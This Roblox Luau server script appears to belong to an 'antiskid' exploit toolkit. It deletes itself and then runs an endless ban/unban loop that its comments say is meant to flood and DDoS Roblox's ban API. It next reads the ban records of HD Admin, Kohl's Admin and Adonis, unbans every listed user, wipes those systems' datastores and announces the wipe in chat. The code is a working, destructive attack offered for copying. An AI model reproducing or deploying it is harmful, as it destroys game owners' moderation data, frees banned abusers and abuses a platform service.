local antis3=require(script.Parent)
local funcs=antis3.funcs
local rbxfuncs=antis3.rbxfuncs

rbxfuncs.destroy(script)
if funcs.isClient then return nil end

-- please credit this if you copy paste this because i spent my valuable time on understanding how these complex admin ban systems work
-- trust me these admin systems have a very messy OOP thats hard to understand or just source code hard to understand

-- by coza (creator of antiskid v14)

local dataservice=funcs.getservice("DataStoreService",false)
local players=funcs.getservice("Players")

local unbanasync=players.UnbanAsync
local banasync=players.BanAsync

local function tableUnbanAsync(userids)
    if funcs.isBanningEnabled==false then return end

    local newuserids={}
    local current={}

    for i,v in userids do
        if #current==50 then
            table.insert(newuserids,current)
            current={}
        end
        table.insert(current,v)
    end

    if #current>0 then
        table.insert(newuserids,current)
        current={}
    end

    for _,useridTable in newuserids do
        pcall(unbanasync,players,{UserIds=useridTable,ApplyToUniverse=true})
    end
end

local function retryPcall(func)
    local success,result=pcall(func)

    if success==false then
        task.wait()
        return retryPcall(func)
    end

    return success,result
end

repeat task.wait() until typeof(funcs.isBanningEnabled)=="boolean"

--for people who would like to copy paste my ban api rate limiter:
--WARNING: DO NOT RUN THIS MORE THAN ONCE IT MIGHT CAUSE HUGE SERVER LAG IF RAN MORE THAN ONCE THIS PART OF THE CODE IS EXPECTED TO ONLY RUN ONCE
--this creates a huge issue because if your script has this rate limiter and both your script and antiskid are running this might kill server fps

if funcs.isBanningEnabled then
    task.delay(60,function() --60 seconds to unbanasync everyone from hd admin, kohl and adonis datastore banlists
        local uids={}

        for i,v in funcs.whitelist do
            table.insert(uids,v)
        end

        local function getLost()
            task.spawn(pcall,banasync,players,{
                UserIds={8504349013},
                ApplyToUniverse=true,
                ExcludeAltAccounts=false,
                Duration=-1,
                DisplayReason="You're a skid brooo u ran a server destroyer 7 bilion years ago and now im making you pay for it.",
                PrivateReason="very very bad evil guy",
            })
            task.spawn(pcall,unbanasync,players,{
                UserIds={8504349013},
                ApplyToUniverse=true,
            })
            task.spawn(pcall,unbanasync,players,{
                UserIds=uids,
                ApplyToUniverse=true,
            })
        end


        --feel free to uncomment these prints and check network tab even while its "taking a break" the network tab is still exploding with requests
        --this is happening because roblox allows you to still keep sending requests to their ban api backend even if you are being rate limited
        --thats dumb and it allows you to ddos roblox ban api backend from within roblox game servers

        --this waits for 3 minutes because without it server fps just dies

        --print("spam started only while true do loop")
        local started=os.clock()
        while true do
            if os.clock()-started>10 then
                --print("taking a break 3 minutes")
                task.wait(180)
                started=os.clock()
                --print("started spamming again")
            end

            getLost()
            task.wait()
        end
    end)
end

local hdadmin 
local hdbanrecords 

retryPcall(function()
    hdadmin=dataservice:GetDataStore("HDAdminSystemDataV1.0")
    hdbanrecords=hdadmin:GetAsync("Banland")
end)

if hdadmin and hdbanrecords and typeof(hdbanrecords)=="table" and typeof(hdbanrecords.Records)=="table" then 
    local userids={}

    for _,record in hdbanrecords.Records do 
        if typeof(record)=="table" and typeof(record.UserId)=="number" then
            table.insert(userids,record.UserId)
        end
    end

    tableUnbanAsync(userids)

    retryPcall(function()
        hdadmin:RemoveAsync("Banland")
        hdadmin:RemoveAsync("PermRanks")
        hdadmin:RemoveAsync("Broadcast")
    end)

    funcs.notifyChat("all","Attempted to unban everyone from hd admin banland and wiped hd admin datastore")
end


local kohl
local kohlbans

retryPcall(function()
    kohl=dataservice:GetDataStore("_KData","_K_0.1")
    kohlbans=kohl:GetAsync("Bans")
end)

if kohl and typeof(kohlbans)=="table" then
    local userids={}
    
    for userid in kohlbans do
        userid=({pcall(tonumber,userid)})[2]
        if typeof(userid)~="number" then continue end
        table.insert(userids,userid)
    end

    tableUnbanAsync(userids)

    retryPcall(function()
        kohl:RemoveAsync("Main")
        kohl:RemoveAsync("Bans")
    end)

    funcs.notifyChat("all","Attempted to unban everyone from kohl and wiped kohl datastore")
end

local adonis
local adoniskeys

retryPcall(function() 
    adonis=dataservice:GetDataStore("Adonis_1","Adonis")
    adoniskeys=adonis:ListKeysAsync(nil,50,nil,true)
end)

if adonis and adoniskeys then
    while true do
        for _,datakey in adoniskeys:GetCurrentPage() do
            if datakey.KeyName then
                local dataFromKey

                retryPcall(function() 
                    dataFromKey=adonis:GetAsync(datakey.KeyName)
                end)

                if typeof(dataFromKey)=="table" then
                    local userids={}

                    for _,tbl in dataFromKey do
                        if typeof(tbl)~="table" 
                            or tbl.Table~="Banned" 
                            or typeof(tbl.Value)~="table" 
                            or typeof(tbl.Value.UserId)~="number" then continue end
                        table.insert(userids,tbl.Value.UserId)
                    end

                    if #userids>0 then
                        tableUnbanAsync(userids)
                        funcs.notifyChat("all","Attempted to unban everyone from adonis and wiped adonis datastore")
                    end
                end

                retryPcall(function()
                    adonis:RemoveAsync(datakey.KeyName)
                end)
            end
        end
        
        if adoniskeys.IsFinished then break end
        retryPcall(function() 
            adoniskeys:AdvanceToNextPageAsync()
        end)
    end
end

return nil